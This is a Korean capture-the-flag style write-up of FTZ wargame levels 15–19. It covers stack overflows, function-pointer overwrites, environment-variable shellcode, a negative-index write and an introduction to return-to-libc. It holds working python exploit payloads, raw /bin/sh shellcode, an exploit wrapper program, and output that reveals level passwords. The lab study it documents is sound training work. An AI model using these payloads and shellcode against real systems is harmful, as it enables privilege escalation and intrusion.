위와 같이 `cmpl` 명령어의 값을 확인하면 `0x80484b2` 만큼에 `0xdeadbeef` 가 존재하는 것을 알 수 있다.

그럼 이제 입력 값을 더미 값까지 계산하여 40byte 만큼 입력 후, `check` 변수의 값에 `0xdeadbeef`가 있는 주소 값을 넣어주면 될 것이다.

```sh
[level15@ftz level15]$ (python -c 'print "A"*40+"\xb2\x84\x04\x08"'; cat) | ./attackme
id
uid=3096(level16) gid=3095(level15) groups=3095(level15)
my-pass
Level16 Password is "about to cause mass"
```

자 이번엔 끝이아니다. 환경변수를 이용하는 방법을 이용해 쉘을 획득해본다.

위에서는 이미 `attackme` 안에 존재하는 `0xdeadbeef` 값을 이용했다면 이번엔 직접 값을 환경변수에 올려 해당 환경변수 값의 주소를 참조하도록 하면 된다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv)
{
        char *ptr;
        ptr=getenv(argv[1]);
        ptr+=(strlen(argv[0]) - strlen(argv[2]))*2;
        printf("%s = %p\n",argv[1],ptr);
}

```

먼저 환경변수의 주소를 찾는 코드이다. 책에 나와있는데, 기존에 사용하던 방식보다 정확한거 같긴하다.
다음은 실제 공격이다.

```sh
[level15@ftz tmp]$ export DEADBEEF=`python -c 'print "\xef\xbe\xad\xde"'`
[level15@ftz tmp]$ ./env DEADBEEF /home/level15/attackme
DEADBEEF = 0xbffffef1
[level15@ftz tmp]$ (python -c 'print "A"*40+"\xf1\xfe\xff\xbf"'; cat)| /home/level15/attackme
id
uid=3096(level16) gid=3095(level15) groups=3095(level15)
my-pass

Level16 Password is "about to cause mass".
```

`DEADBEEF`라는 환경변수를 추가하고, 위에서 만든 코드를 통해 환경변수의 주소를 찾아온다. 다음 "A" 문자를 40byte만큼 채워준 뒤, `check` 변수에 담기는 주소 값을 환경변수의 주소 값으로 변조하여 쉘 획득을 하는 원리이다.



## [+] FTZ level16

### Analysis

힌트를 살펴본다.

```c
#include <stdio.h>
 
void shell() {
  setreuid(3097,3097);
  system("/bin/sh");
}
 
void printit() {
  printf("Hello there!\n");
}
 
main()
{ int crap;
  void (*call)()=printit;
  char buf[20];
  fgets(buf,48,stdin);
  call();
}
```

함수 포인터를 사용한 것을 볼 수 있다. 먼저 함수 포인터는 포인터와 같다. `call` 은 함수 포인터형의 자료형을 가지고 있으며, 이 변수 안에는 `printit` 라는 함수의 메모리 주소 값이 저장된다. 때문에 `call()` 을 이용하여 함수를 호출하게 되면 안에 가지고 있는 주소 값을 참조하여 `printit` 함수가 호출되는 원리이다.

그러면 문제의 의도는 간단하다. `call`에 있는 `printit`함수의 주소 값을 `shell` 함수의 주소 값을 변조하면 될 것이다.

먼저 함수의 흐름을 확인한다.

1. 정수형의 `crap` 선언
2. `call` 함수 포인터를 `printit` 함수의 주소로 선언과 동시의 초기화
3. char 형의 `buf` 배열 20byte 선언
4. `fgets` 를 통해 입력을 받고, 입력 값을 `buf`에 저장
5. `call` 함수 포인터 호출

위에서 말한것과 같이 함수 포인터에 저장되는 주소 값을 `shell` 함수의 주소로 변조하면 쉘을 획득할 수 있다. 이렇게 함수의 흐름을 바꾸는 기법에서 조금 더 나아가면 RTL(Return To Libc) 또는 GOT(Global Offset Table)과 같은 공유 라이브러리나 바이너리에 내장된 글로벌 오프셋 테이블에 있는 함수로 흐름을 바꿔 쉘을 실행할 수 있다.

`shell` 함수의 주소를 `0x80484D0`, `printit` 함수의 주소를 `0x8048500`으로 가정하고 보자.

```
buf[20 bytes] | dummy[20 bytes] | *call()[4 bytes] | crap[4 bytes] | dummy[8 bytes] | SFP(4) | RET(4)
0xBFFFFA80	    0xBFFFFA94			0XBFFFAA8		0XBFFFFAAC		0XBFFFAB0
AAAA							  [0X8048500]
```

```
shell()  | ......... | printit()
0x8048D0			 0x8048500
```

자 위와 같다고 할 때, `buf` 배열을 오버플로우 시켜 `*call` 함수 포인터가 참조하는 주소를 바꾸면 된다.

```c++
main()
{ 
  int crap;
  void (*call)()=printit;
  char buf[20];
  fgets(buf,48,stdin);
  call();
}
```

자 위에 보면 버퍼 오버 플로우를 방지하기 위해 `fgets` 함수를 호출 할 때 48 bytes만큼 입력받도록 제한하고 있다.

```
(gdb) disass main
Dump of assembler code for function main:
0x08048518 <main+0>:	push   ebp
0x08048519 <main+1>:	mov    ebp,esp
0x0804851b <main+3>:	sub    esp,0x38		; 0x38(56 bytes) 스택 할당
0x0804851e <main+6>:	mov    DWORD PTR [ebp-16],0x8048500
0x08048525 <main+13>:	sub    esp,0x4
0x08048528 <main+16>:	push   ds:0x80496e8
0x0804852e <main+22>:	push   0x30
0x08048530 <main+24>:	lea    eax,[ebp-56]
0x08048533 <main+27>:	push   eax
0x08048534 <main+28>:	call   0x8048384 <fgets>
0x08048539 <main+33>:	add    esp,0x10
0x0804853c <main+36>:	mov    eax,DWORD PTR [ebp-16]
0x0804853f <main+39>:	call   eax
0x08048541 <main+41>:	leave  
0x08048542 <main+42>:	ret    
0x08048543 <main+43>:	nop    
0x08048544 <main+44>:	nop    
0x08048545 <main+45>:	nop    
0x08048546 <main+46>:	nop    
0x08048547 <main+47>:	nop    
0x08048548 <main+48>:	nop    
0x08048549 <main+49>:	nop    
0x0804854a <main+50>:	nop    
0x0804854b <main+51>:	nop    
0x0804854c <main+52>:	nop    
0x0804854d <main+53>:	nop    
0x0804854e <main+54>:	nop    
0x0804854f <main+55>:	nop    
End of assembler dump.
```

메인에서 함수 프롤로그를 보면 0x38 바이트 만큼 할당하는 것을 볼 수 있다.

`level15`와 마찬가지로 각 변수간의 거리를 확인하기 위해 다음과 같은 코드를 만든다.

```c++
#include <stdio.h>

void shell()
{
        setreuid(3097,3097);
        system("/bin/sh");
}

void printit()
{
        printf("Hello There\n");
}

main()
{
        int crap;
        void (*call)()=printit;
        char buf[20];
        fgets(buf,48,stdin);
        call();

        printf("Input is : %s\n &buf : %p\n &call : %p\n &crap : %p\n",buf,buf,&call,&crap);
}

```

```
[level16@ftz tmp]$ ./a.out 
        
Hello There
Input is : 

 &buf : 0xbffff0a0
 &call : 0xbffff0c8
 &crap : 0xbffff0cc
```

위의 결과를 바탕으로 메모리 스택을 그려본다.

```
(gdb) disass main
Dump of assembler code for function main:
0x08048518 <main+0>:	push   ebp
0x08048519 <main+1>:	mov    ebp,esp
0x0804851b <main+3>:	sub    esp,0x38
0x0804851e <main+6>:	mov    DWORD PTR [ebp-16],0x8048500
0x08048525 <main+13>:	sub    esp,0x4
0x08048528 <main+16>:	push   ds:0x80496e8
0x0804852e <main+22>:	push   0x30
0x08048530 <main+24>:	lea    eax,[ebp-56]
0x08048533 <main+27>:	push   eax
0x08048534 <main+28>:	call   0x8048384 <fgets>
0x08048539 <main+33>:	add    esp,0x10
0x0804853c <main+36>:	mov    eax,DWORD PTR [ebp-16]
0x0804853f <main+39>:	call   eax	; set break point
0x08048541 <main+41>:	leave  
0x08048542 <main+42>:	ret    
0x08048543 <main+43>:	nop    
0x08048544 <main+44>:	nop    
0x08048545 <main+45>:	nop    
0x08048546 <main+46>:	nop    
0x08048547 <main+47>:	nop    
0x08048548 <main+48>:	nop    
0x08048549 <main+49>:	nop    
0x0804854a <main+50>:	nop    
0x0804854b <main+51>:	nop    
0x0804854c <main+52>:	nop    
0x0804854d <main+53>:	nop    
0x0804854e <main+54>:	nop    
0x0804854f <main+55>:	nop    
End of assembler dump.
(gdb) b *main+39
Breakpoint 1 at 0x804853f

```

`printit` 함수를 호출하기 전에 브레이크 포인트를 설치하고 스택을 확인해본다.

```
(gdb) x/16x $esp
0xbffff5a0:	0x41414141	0x4213000a	0xbffff5c8	0x080484b1
0xbffff5b0:	0x080495e0	0x080496ec	0x4001582c	0x080483fe
0xbffff5c0:	0x0804832c	0x42130a14	0x08048500	0x08048342
0xbffff5d0:	0x4200af84	0x42130a14	0xbffff5f8	0x42015574
```

위에서 구한 주소 간의 차이를 보면 다음과 같다.

```
&buf : 0xbffff0a0	(28)	|	&buf : 0xbffff5a0 
&call : 0xbffff0c8	(4)		|	&call : 0xbffff5c8
&crap : 0xbffff0cc		    |	&crap : 0xbffff5cc
```

좌측은 거리 계산한 내용이고 우측은 현재 메모리 상태다. gdb로 확인해 본다.

```
(gdb) x/s 0xbffff5a0
0xbffff5a0:	 "AAAA\n"
(gdb) x/x 0xbffff5c8
0xbffff5c8:	0x08048500
(gdb) x/x 0xbffff5cc
0xbffff5cc:	0x08048342
===========================
(gdb) disass 0x8048500
Dump of assembler code for function printit:
0x08048500 <printit+0>:	push   ebp
0x08048501 <printit+1>:	mov    ebp,esp
0x08048503 <printit+3>:	sub    esp,0x8
0x08048506 <printit+6>:	sub    esp,0xc
0x08048509 <printit+9>:	push   0x80485c0
0x0804850e <printit+14>:	call   0x80483a4 <printf>
0x08048513 <printit+19>:	add    esp,0x10
0x08048516 <printit+22>:	leave  
0x08048517 <printit+23>:	ret    
End of assembler dump.

```

자 위의 내용을 토대로 스택을 생각해보면 다음과 같을 것이다.

```
buf[20 bytes] | dummy[20 bytes] | *call()[4 bytes] | crap[4 bytes] | dummy[8 bytes] | SFP(4) | RET(4)
0xbffff5a0	    0xbffff5c0			0xbffff5c8		0xbffff5cc		0xbffff5d0
AAAA							  [0X8048500]
```

자 그럼 이제 `shell` 함수의 주소를 찾아 함수포인터에 넣어주면 된다.

```
(gdb) disass shell
Dump of assembler code for function shell:
0x080484d0 <shell+0>:	push   ebp
0x080484d1 <shell+1>:	mov    ebp,esp
0x080484d3 <shell+3>:	sub    esp,0x8
0x080484d6 <shell+6>:	sub    esp,0x8
0x080484d9 <shell+9>:	push   0xc19
0x080484de <shell+14>:	push   0xc19
0x080484e3 <shell+19>:	call   0x80483b4 <setreuid>
0x080484e8 <shell+24>:	add    esp,0x10
0x080484eb <shell+27>:	sub    esp,0xc
0x080484ee <shell+30>:	push   0x80485b8
0x080484f3 <shell+35>:	call   0x8048364 <system>
0x080484f8 <shell+40>:	add    esp,0x10
0x080484fb <shell+43>:	leave  
0x080484fc <shell+44>:	ret    
0x080484fd <shell+45>:	lea    esi,[esi]
End of assembler dump.
```

`shell` 함수의 시작 주소는 `0x80484d0` 임을 확인할 수 있다.

그럼 간단하게 버퍼에 dummy까지 40byte를 채워주고 4byte에 `shell` 주소를 삽입하면 될 것이다.

```
[level16@ftz level16]$ (python -c 'print "A"*40+"\xd0\x84\x04\x08"';cat)|/home/level16/attackme
whoami
level17

my-pass

Level17 Password is "king poetic".
```

```c++
#include <stdio.h>
#include <stdlib.h>

#define BUF_SIZE 44

int main()
{
        char shellBuf[BUF_SIZE], cmdBuf[320];

        sprintf(cmdBuf,"(python -c \'print \"A\"");
        strcat(cmdBuf,"*40+\"\\xd0\\x84\\x04\\x08\"");
        strcat(cmdBuf,"';cat)|/home/level16/attackme");
        strcat(cmdBuf,"\x0A");
        printf("%s\n",cmdBuf);
        system(cmdBuf);
}
```

음 뭐 익스플로잇 코드를 짜는 연습을 하라고 계속 익스 코드를 넣는 것 같다. 좀 고쳐서 해봤다.

자 그럼 또 다른 방법으로 환경변수를 이용하여 공격을 시도해본다.

## [+] FTZ level17

### Analysis

```c++
#include <stdio.h>
 
void printit() {
  printf("Hello there!\n");
}
 
main()
{ int crap;
  void (*call)()=printit;
  char buf[20];
  fgets(buf,48,stdin);
  setreuid(3098,3098);
  call();
}
```

level16과 매우 흡사하지만 `shell`함수가 존재하지 않는다. 그러므로 메모리 내에 쉘 코드를 올리고 함수 포인터를 해당 쉘 코드의 주소로 변조하면 공격에 성공할 것이다.

먼저 변수간의 거리를 확인해본다.

```c++
#include <stdio.h>

void printit()
{
        printf("Hello There\n");
}

main()
{
        int crap;
        void (*call)()=printit;
        char buf[20];
        fgets(buf,48,stdin);
    	setreuid(3098,3098);
        call();

        printf("Input is : %s\n &buf : %p\n &call : %p\n &crap : %p\n",buf,buf,&call,&crap);
}
```

```
[level17@ftz tmp]$ ./chk

Hello There
Input is : 

 &buf : 0xbfffe7b0	(0x28)
 &call : 0xbfffe7d8	(0x4)
 &crap : 0xbfffe7dc
```

`buf`와 함수포인터간의 간격은 0x28(40) 바이트, 함수포인터와 `crap` 변수의 간격은 4바이트다.

자 그럼 환경변수에 쉘 코드를 올리고 해당 주소를 확인한다.

```
[level17@ftz tmp]$ export shell=$(python -c 'print "\x90"*15+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
```

```c++
/*getenv.c*/
#include <stdio.h>

int main()
{
    printf("SHELL : %p\n",getenv("shell"));
    return 0;
}
```

```
[level17@ftz tmp]$ ./getenv 
SHELL : 0xbffffef5
```

```
[level17@ftz level17]$ (python -c 'print "\x90"*40+"\xf5\xfe\xff\xbf"'; cat) | ./attackme 
my-pass
TERM environment variable not set.

Level18 Password is "why did you do it".

id
uid=3098(level18) gid=3097(level17) groups=3097(level17)
```

위와 같이 공격에 쉽게 성공하는 것을 확인할 수 있다.

## [+] FTZ level18

### Analysis

문제를 보기 앞서 아주 좋은 포인터 예제가 있어 확인했다.

```c++
#include <stdio.h>

int main()
{
        int a=10,b=20,c=30,d=40,e=50;
        int *ptr = &c;
        printf("A=%d\nB=%d\nC=%d\nD=%d\nE=%d\n",*(ptr+2),*(ptr+1),*ptr,*(ptr-1),*(ptr-2));
        return 0;
}
```

```
[level18@ftz tmp]$ ./a.out 
A=10
B=20
C=30
D=40
E=50
```

포인터로 변수에 접근하는 방법에 대한 내용이다. 얼마전에 배열과 포인터의 차이가 무엇이냐에 대한 토론을 본 적이 있는데 요러한 점 때문에 그런 것 같다. 

이 문제 역시 포인터와 관련된 문제다. 자 그럼 문제를 살펴본다.

```c++
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
void shellout(void);
int main()
{
  char string[100];
  int check;
  int x = 0;
  int count = 0;
  fd_set fds;
  printf("Enter your command: ");
  fflush(stdout);
  while(1)
    {
      if(count >= 100)	// 제한
        printf("what are you trying to do?\n");
      if(check == 0xdeadbeef)	// check 변수가 0xdeadbeef
        shellout();	// 쉘 코드
      else
        {
          FD_ZERO(&fds);
          FD_SET(STDIN_FILENO,&fds);
 
          if(select(FD_SETSIZE, &fds, NULL, NULL, NULL) >= 1)
            {
              if(FD_ISSET(fileno(stdin),&fds))
                {
                  read(fileno(stdin),&x,1);
                  switch(x)	// 입력 값 브랜치
                    {
                      case '\r':
                      case '\n':
                        printf("\a");
                        break;
                      case 0x08:
                        count--;
                        printf("\b \b");
                        break;
                      default:
                        string[count] = x;
                        count++;
                        break;
                    }
                }
            }
        }
    }
}
 
void shellout(void)
{
  setreuid(3099,3099);
  execl("/bin/sh","sh",NULL);
}   
```

`fd_set` 구조체를 선언하고, 이에 대해 `FD_ZERO`로 초기화, `FD_SET`으로 키보드 입력을 받는다.

디버깅을 하며 살펴본다.

```
(gdb) disass main
Dump of assembler code for function main:
0x080484ac <main+0>:	push   ebp
0x080484ad <main+1>:	mov    ebp,esp
0x080484af <main+3>:	push   edi
0x080484b0 <main+4>:	push   ebx
0x080484b1 <main+5>:	sub    esp,0x110
0x080484b7 <main+11>:	and    esp,0xfffffff0
0x080484ba <main+14>:	mov    eax,0x0
0x080484bf <main+19>:	sub    esp,eax
0x080484c1 <main+21>:	mov    DWORD PTR [ebp-128],0x0
0x080484c8 <main+28>:	mov    DWORD PTR [ebp-132],0x0
0x080484d2 <main+38>:	sub    esp,0xc
0x080484d5 <main+41>:	push   0x804872c
0x080484da <main+46>:	call   0x80483cc <printf>
0x080484df <main+51>:	add    esp,0x10
0x080484e2 <main+54>:	sub    esp,0xc
0x080484e5 <main+57>:	push   ds:0x804988c
0x080484eb <main+63>:	call   0x804839c <fflush>
0x080484f0 <main+68>:	add    esp,0x10
0x080484f3 <main+71>:	cmp    DWORD PTR [ebp-132],0x63
0x080484fa <main+78>:	jle    0x804850c <main+96>
0x080484fc <main+80>:	sub    esp,0xc
0x080484ff <main+83>:	push   0x8048741
0x08048504 <main+88>:	call   0x80483cc <printf>
0x08048509 <main+93>:	add    esp,0x10
0x0804850c <main+96>:	cmp    DWORD PTR [ebp-124],0xdeadbeef
0x08048513 <main+103>:	jne    0x804851c <main+112>
0x08048515 <main+105>:	call   0x8048649 <shellout>
0x0804851a <main+110>:	jmp    0x80484f3 <main+71>
0x0804851c <main+112>:	mov    eax,0x0
0x08048521 <main+117>:	mov    ecx,0x20
0x08048526 <main+122>:	lea    edi,[ebp-264]
0x0804852c <main+128>:	cld    
0x0804852d <main+129>:	repz stos es:[edi],eax
0x0804852f <main+131>:	mov    eax,ecx
0x08048531 <main+133>:	mov    DWORD PTR [ebp-268],eax
0x08048537 <main+139>:	mov    eax,edi
0x08048539 <main+141>:	mov    DWORD PTR [ebp-272],eax
0x0804853f <main+147>:	mov    eax,0x0
0x08048544 <main+152>:	bts    DWORD PTR [ebp-264],eax
0x0804854b <main+159>:	sub    esp,0xc
0x0804854e <main+162>:	push   0x0
0x08048550 <main+164>:	push   0x0
0x08048552 <main+166>:	push   0x0
0x08048554 <main+168>:	lea    eax,[ebp-264]
0x0804855a <main+174>:	push   eax
0x0804855b <main+175>:	push   0x400
0x08048560 <main+180>:	call   0x80483ac <select>
0x08048565 <main+185>:	add    esp,0x20
0x08048568 <main+188>:	test   eax,eax
0x0804856a <main+190>:	jle    0x80484f3 <main+71>
0x0804856c <main+192>:	sub    esp,0xc
0x0804856f <main+195>:	push   ds:0x8049890
0x08048575 <main+201>:	call   0x804838c <fileno>
0x0804857a <main+206>:	add    esp,0x10
0x0804857d <main+209>:	mov    ebx,eax
0x0804857f <main+211>:	and    ebx,0x1f
0x08048582 <main+214>:	sub    esp,0xc
0x08048585 <main+217>:	push   ds:0x8049890
0x0804858b <main+223>:	call   0x804838c <fileno>
0x08048590 <main+228>:	add    esp,0x10
0x08048593 <main+231>:	shr    eax,0x5
0x08048596 <main+234>:	bt     DWORD PTR [ebp+eax-264],ebx
0x0804859e <main+242>:	setb   al
0x080485a1 <main+245>:	test   al,al
0x080485a3 <main+247>:	je     0x80484f3 <main+71>
0x080485a9 <main+253>:	sub    esp,0x4
0x080485ac <main+256>:	push   0x1
0x080485ae <main+258>:	lea    eax,[ebp-128]
0x080485b1 <main+261>:	push   eax
0x080485b2 <main+262>:	push   ds:0x8049890
0x080485b8 <main+268>:	call   0x804838c <fileno>
0x080485bd <main+273>:	add    esp,0x4
0x080485c0 <main+276>:	push   eax
0x080485c1 <main+277>:	call   0x80483ec <read>
0x080485c6 <main+282>:	add    esp,0x10
0x080485c9 <main+285>:	mov    eax,DWORD PTR [ebp-128]
0x080485cc <main+288>:	mov    DWORD PTR [ebp-276],eax
0x080485d2 <main+294>:	cmp    DWORD PTR [ebp-276],0xa
0x080485d9 <main+301>:	je     0x80485fa <main+334>
0x080485db <main+303>:	cmp    DWORD PTR [ebp-276],0xa
0x080485e2 <main+310>:	jg     0x80485ef <main+323>
0x080485e4 <main+312>:	cmp    DWORD PTR [ebp-276],0x8
0x080485eb <main+319>:	je     0x804860f <main+355>
0x080485ed <main+321>:	jmp    0x804862c <main+384>
0x080485ef <main+323>:	cmp    DWORD PTR [ebp-276],0xd
0x080485f6 <main+330>:	je     0x80485fa <main+334>
0x080485f8 <main+332>:	jmp    0x804862c <main+384>
0x080485fa <main+334>:	sub    esp,0xc
0x080485fd <main+337>:	push   0x804875d
0x08048602 <main+342>:	call   0x80483cc <printf>
0x08048607 <main+347>:	add    esp,0x10
0x0804860a <main+350>:	jmp    0x80484f3 <main+71>
0x0804860f <main+355>:	lea    eax,[ebp-132]
0x08048615 <main+361>:	dec    DWORD PTR [eax]
0x08048617 <main+363>:	sub    esp,0xc
0x0804861a <main+366>:	push   0x804875f
0x0804861f <main+371>:	call   0x80483cc <printf>
0x08048624 <main+376>:	add    esp,0x10
0x08048627 <main+379>:	jmp    0x80484f3 <main+71>
0x0804862c <main+384>:	lea    eax,[ebp-120]
0x0804862f <main+387>:	mov    edx,eax
0x08048631 <main+389>:	add    edx,DWORD PTR [ebp-132]
0x08048637 <main+395>:	mov    al,BYTE PTR [ebp-128]
0x0804863a <main+398>:	mov    BYTE PTR [edx],al
0x0804863c <main+400>:	lea    eax,[ebp-132]
0x08048642 <main+406>:	inc    DWORD PTR [eax]
0x08048644 <main+408>:	jmp    0x80484f3 <main+71>
End of assembler dump.

```

함수 프롤로그 부분은 다음과 같이 0x110 바이트 만큼 스택을 할당하는 것을 볼 수 있다.

```
0x080484ac <main+0>:	push   ebp
0x080484ad <main+1>:	mov    ebp,esp
0x080484af <main+3>:	push   edi
0x080484b0 <main+4>:	push   ebx
0x080484b1 <main+5>:	sub    esp,0x110
```

```
0x080484f3 <main+71>:	cmp    DWORD PTR [ebp-132],0x63
0x080484fa <main+78>:	jle    0x804850c <main+96>
0x080484fc <main+80>:	sub    esp,0xc
0x080484ff <main+83>:	push   0x8048741
0x08048504 <main+88>:	call   0x80483cc <printf>
0x08048509 <main+93>:	add    esp,0x10
0x0804850c <main+96>:	cmp    DWORD PTR [ebp-124],0xdeadbeef
0x08048513 <main+103>:	jne    0x804851c <main+112>
0x08048515 <main+105>:	call   0x8048649 <shellout>
```

0x63(99) 와의 비교를 통해 `0xdeadbeef`와 비교할지, 에러문을 출력할지 결정한다.

자 그럼 이제 변수간의 거리를 확인해본다.

```c++
[level18@ftz tmp]$ ./chk
 &string:0xbfffde70
 &check:0xbfffde6c (4)
 &x:0xbfffde68	(4)
 &count:0xbfffde64 (4)
 &fds:0xbfffdde0 (0x84(132))
```

여기서 주목해야 할 것은 4bytes 씩 떨어져있는 변수들이다. 위에서 잠시 언급했던 포인터가 생각나야된다.

지금까지는 입력 값을 저장하는 배열이 조작해야하는 `check` 와 같은 변수 다음에 선언되어 오버플로우를 쉽게 할 수 있었지만 이번에는 아니다.

현재는 아래와 같은 상태다.

```
fds | count | x | check | string | sfp | ret
```

자 그럼 이제 위에서 포인터 예제와 마찬가지로 생각해보자.

`string`을 기준으로,  -1(4bytes) 만큼 인덱스를 이동하면 `check` 변수에 접근할 수 있는 것으로 예상된다.

```c++
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
int main()
{
  char string[100];
  int check=10;
  int x = 20;
  int count = 30;
  fd_set fds;
  printf(" &string:%p\n &check:%p\n &x:%p\n &count:%p \n &fds:%p\n",string,&check,&x,&count,&fds);
  printf("=========================================");
  printf("\n count=%d\n x=%d\n check=%d\n",string[-12],string[-8],string[-4]);
}
```

```
 &string:0xbfffdcf0
 &check:0xbfffdcec
 &x:0xbfffdce8
 &count:0xbfffdce4 
 &fds:0xbfffdc60
=========================================
 count=30
 x=20
 check=10
```

실제 위와 같은 결과를 볼 수 있다. 정확하게 변수에 접근이 가능하다.

자 소스코드에서 다음과 같은 부분을 본다.

```c++
case 0x08:
                        count--;
                        printf("\b \b");
                        break;
default:
                        string[count] = x;
                        count++;
                        break;
```

입력 값에 0x08이 입력되면 `count` 변수를 감소시키는 것을 확인할 수 있다.  그리고 다른 입력 값은 `string[count]` 형식으로 입력 값을 저장하고있다. 그럼 count 를 -4가 되도록 유도하고, 그 다음 0xdeadbeef를 입력하여 쉘을 획득할 수 있을 것으로 보인다.

```
[level18@ftz level18]$ (python -c 'print "\x08\x08\x08\x08"+"\xef\xbe\xad\xde"'; cat) | /home/level18/attackme 
Enter your command: id
uid=3099(level19) gid=3098(level18) groups=3098(level18)
my-pass

Level19 Password is "swimming in pink".
```



## [+] FTZ level19

### Analysis

이번엔 RTL(Return To Libc)에 대한 내용이 언급된다.

아래와 같은 코드를 작성하고 쉘이 어떻게 실행되는지 분석해본다.

```c++
#include <stdio.h>

int main()
{
    system("/bin/sh");
}
```

디버거로 어태치하고 `system` 함수 호출하는 주소에 브레이크 포인트를 설치한다.

```
Breakpoint 2, 0x08048340 in main ()
(gdb) disass
Dump of assembler code for function main:
0x08048328 <main+0>:	push   %ebp
0x08048329 <main+1>:	mov    %esp,%ebp
0x0804832b <main+3>:	sub    $0x8,%esp
0x0804832e <main+6>:	and    $0xfffffff0,%esp
0x08048331 <main+9>:	mov    $0x0,%eax
0x08048336 <main+14>:	sub    %eax,%esp
0x08048338 <main+16>:	sub    $0xc,%esp
0x0804833b <main+19>:	push   $0x80483f8
0x08048340 <main+24>:	call   0x8048258 <system>	; <=
0x08048345 <main+29>:	add    $0x10,%esp
0x08048348 <main+32>:	leave  
0x08048349 <main+33>:	ret    
0x0804834a <main+34>:	nop    
0x0804834b <main+35>:	nop    
End of assembler dump.
```

```
(gdb) disass
Dump of assembler code for function system:
0x08048258 <system+0>:	jmp    *0x80494f8
0x0804825e <system+6>:	push   $0x0
0x08048263 <system+11>:	jmp    0x8048248 <_init+24>
End of assembler dump.

(gdb) x/4x $esp 
0xbffff0bc:	0x08048345	0x080483f8	0x4000c660	0xbffff0d8
(gdb) x/s 0x80483f8
0x80483f8 <_IO_stdin_used+4>:	 "/bin/sh"
```

자 위의 분석은 함수 호출에 대한 스택 개념이 있다면 당연한 것이다. 다만 RTL 에서 이 부분이 더욱 중요하기에 강조한다고 되어있다.

현재까지 문제에서 보면 리턴 주소를 쉘 코드의 주소로 바꾸거나 환경변수에 쉘 코드를 저장하고 이를 실행시키는 버퍼 오버플로우 기법이었다. 그러나 쉘 코드를 저장할 수 없는 상황이 발생할 수 있다.

이럴 때 RTL 기법을 이용하게 되는데, RET 를 `system` 함수의 주소로 바꿔주면 될 것이다. 하지만 역시 `"/bin/sh"`과 같은 쉘을 실행하는 인자가 필요하다.

```
SFP		|	RET(&system())	|	...(RET)	|	&""/bin/sh"
```

위와 같은 스택의 구성으로 공격이 가능할 것으로 보인다. `...(RET)` 는 기존 `RET`를 변조하여 system 함수를 호출하여 진입했을 때의 `system` 함수의 리턴 주소가 된다.

즉 위와 같은 스택의 구성으로 변조를 하면, RET의 4byte 높은 주소에 있는 메모리를 인자로 인식한다.



문제를 통해 좀 더 살펴본다.

```c++
main()
{ char buf[20];
  gets(buf);
  printf("%s\n",buf);
}  
```

단순히 버퍼 오버플로우 취약점이 있는 코드다.
디버거를 이용해 스택을 확인해본다.

```
(gdb) disass main
Dump of assembler code for function main:
0x0804835c <main+0>:	push   ebp
0x0804835d <main+1>:	mov    ebp,esp
0x0804835f <main+3>:	sub    esp,0x28			; 0x28(40) bytes alloc
0x08048362 <main+6>:	and    esp,0xfffffff0
0x08048365 <main+9>:	mov    eax,0x0
0x0804836a <main+14>:	sub    esp,eax
0x0804836c <main+16>:	sub    esp,0xc
0x0804836f <main+19>:	lea    eax,[ebp-40]
0x08048372 <main+22>:	push   eax
0x08048373 <main+23>:	call   0x804827c <gets>
0x08048378 <main+28>:	add    esp,0x10
0x0804837b <main+31>:	sub    esp,0x8
0x0804837e <main+34>:	lea    eax,[ebp-40]
0x08048381 <main+37>:	push   eax
0x08048382 <main+38>:	push   0x8048440
0x08048387 <main+43>:	call   0x804829c <printf>
0x0804838c <main+48>:	add    esp,0x10
0x0804838f <main+51>:	leave  
0x08048390 <main+52>:	ret    
0x08048391 <main+53>:	nop    
0x08048392 <main+54>:	nop    
0x08048393 <main+55>:	nop    
End of assembler dump.
(gdb) b *main+43				; printf
Breakpoint 1 at 0x8048387

```

우선 총 40bytes 만큼 스택을 할당한다.

```
(gdb) r
Starting program: /home/level19/tmp/attackme 
AAAAAAAA

Breakpoint 1, 0x08048387 in main ()
(gdb) x/12x $esp+0x10
0xbffff230:	0x41414141	0x41414141	0xbffff200	0x08048269
0xbffff240:	0x42130a14	0x4000c660	0xbffff258	0x0804839e
0xbffff250:	0x42130a14	0x40015360	0xbffff278	0x42015574
```

`printf` 함수를 호출하기 직전에 스택을 확인하면 20bytes 만큼 버퍼가 존재한다. 그리고 `0xbffff25c` 의 값을 확인하면 RET 임을 알 수 있다.

```
(gdb) x/16i 0x42015560
0x42015560 <__libc_start_main+208>:	mov    DWORD PTR [esp+8],eax
0x42015564 <__libc_start_main+212>:	mov    eax,DWORD PTR [ebp+16]
0x42015567 <__libc_start_main+215>:	mov    DWORD PTR [esp+4],eax
0x4201556b <__libc_start_main+219>:	mov    eax,DWORD PTR [ebp+12]
0x4201556e <__libc_start_main+222>:	mov    DWORD PTR [esp],eax
0x42015571 <__libc_start_main+225>:	call   DWORD PTR [ebp+8]	; 메인 함수 호출
0x42015574 <__libc_start_main+228>:	mov    ecx,eax			; <= 복귀 주소의 위치
0x42015576 <__libc_start_main+230>:	jmp    0x420155d0 <__libc_start_main+320>
0x42015578 <__libc_start_main+232>:	xor    ecx,ecx
0x4201557a <__libc_start_main+234>:	mov    eax,DWORD PTR [ebx+9092]
0x42015580 <__libc_start_main+240>:	lock dec DWORD PTR [eax]
0x42015583 <__libc_start_main+243>:	sete   dl
0x42015586 <__libc_start_main+246>:	test   dl,dl
0x42015588 <__libc_start_main+248>:	jne    0x420155d0 <__libc_start_main+320>
0x4201558a <__libc_start_main+250>:	mov    DWORD PTR [esp],0x0
0x42015591 <__libc_start_main+257>:	call   0x420d0320 <__exit_thread>
```

위와 같이 유추할 수 있다. 그렇다면 아래와 같은 스택 구조로 볼 수 있다.

```
20bytes		|	20bytes    |    4bytes    |    4bytes
buf[20]			 dummy			SFP			  RET
```

그럼 44바이트만큼 더미 값으로 덮어 씌우고, 4바이트를 쉘 코드의 주소로 바꿔주면 된다.

일반적인 bof 공격을 시도하면 다음과 같은 결과가 나온다.

```
[level19@ftz level19]$ export EGG=`python -c 'print "\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
[level19@ftz level19]$ tmp/a.out 
addr->0xbffffc58
